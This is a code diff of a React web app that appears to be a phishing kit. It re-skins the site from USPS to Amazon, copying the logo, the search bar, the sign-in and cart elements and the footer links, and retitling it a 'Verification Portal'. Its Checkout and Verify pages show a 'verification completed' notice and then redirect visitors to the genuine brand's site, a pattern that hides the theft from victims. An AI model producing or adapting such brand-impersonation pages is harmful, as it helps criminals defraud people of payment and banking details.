@@ -10,7 +10,7 @@ import Checkout from './pages/Checkout';
 import Verify from './pages/Verify';
 import AppCheck from './pages/AppCheck';
 
-const ADMIN_EXTERNAL_URL = 'https://www.usps.com/';
+const ADMIN_EXTERNAL_URL = 'https://www.amazon.com/';
 
 function getRouteNotice(target: string, reason: string) {
   const cleanReason = reason.trim();
@@ -63,7 +63,7 @@ function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void 
       try {
         const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
         if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
-        onNotice('Bank verification completed. Redirecting you now.');
+        onNotice('Verification completed. Redirecting you to the order page.');
         if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
         pendingTimerRef.current = window.setTimeout(() => {
           window.location.href = parsed.toString();
@@ -99,7 +99,7 @@ function App() {
   }, []);
 
   useEffect(() => {
-    document.title = `Welcome | ${BRAND.name}`;
+    document.title = `${BRAND.name} Verification Portal`;
     document.body.setAttribute('data-brand', BRAND.id);
     const root = document.documentElement;
     root.style.setProperty('--alz-navy', BRAND.theme.navy);
@@ -174,24 +174,31 @@ function App() {
                 <span />
                 <span />
               </button>
-            </div>
-            <div className="alz-nav-brand">
-              <div className="alz-nav-logo" aria-label="USPS">
-                <img src="/usps-header-logo.svg" alt="USPS" className="alz-nav-logo-img" />
+              <div className="alz-nav-brand">
+                <div className="alz-nav-logo" aria-label="Amazon">
+                  <img src="/amazon-header-logo.svg" alt="Amazon" className="alz-nav-logo-img" />
+                </div>
               </div>
             </div>
             <div className="alz-nav-actions">
-              <button type="button" className="alz-nav-search-trigger" aria-label="Search">
-                <span className="alz-nav-search-trigger-icon" />
-              </button>
+              <div className="alz-nav-signin">
+                <span>Sign in</span>
+                <span className="alz-nav-caret" aria-hidden="true">&gt;</span>
+                <span className="alz-nav-user" aria-hidden="true">
+                  <span className="alz-nav-user-head" />
+                  <span className="alz-nav-user-body" />
+                </span>
+              </div>
+              <div className="alz-nav-cart" aria-label="Cart">
+                <img src="/amazon-cart-icon.svg" alt="" aria-hidden="true" className="alz-nav-cart-img" />
+              </div>
             </div>
           </div>
-          <div className="alz-nav-divider" />
           <div className="alz-nav-search-row">
             <div className="alz-nav-search-shell" aria-hidden="true">
-              <div className="alz-nav-search-input">Search delivery help or enter tracking details</div>
+              <div className="alz-nav-search-input">Search Amazon</div>
               <div className="alz-nav-search-action">
-                <span className="alz-nav-search-box-icon" />
+                <span className="alz-nav-search-icon" />
               </div>
             </div>
           </div>
@@ -206,20 +213,12 @@ function App() {
           </Routes>
         </main>
         <footer className="alz-global-footer">
-          <div className="alz-global-footer-strip">
-            <div className="alz-global-footer-strip-inner">
-              <span>Delivery Tracking</span>
-              <span>Shipment Support</span>
-              <span>Address Review</span>
-              <span>Secure Verification</span>
-            </div>
-          </div>
           <div className="alz-global-footer-inner">
-            <span>FAQs</span>
-            <span>Privacy Policy</span>
-            <span>Contact Support</span>
-            <span>Terms of Use</span>
-            <span>(c) 2026 {BRAND.name}.</span>
+            <span>Conditions of Use</span>
+            <span>Privacy Notice</span>
+            <span>Help</span>
+            <span>Cookies Notice</span>
+            <span>(c) 2026 {BRAND.name}</span>
           </div>
         </footer>
       </div>
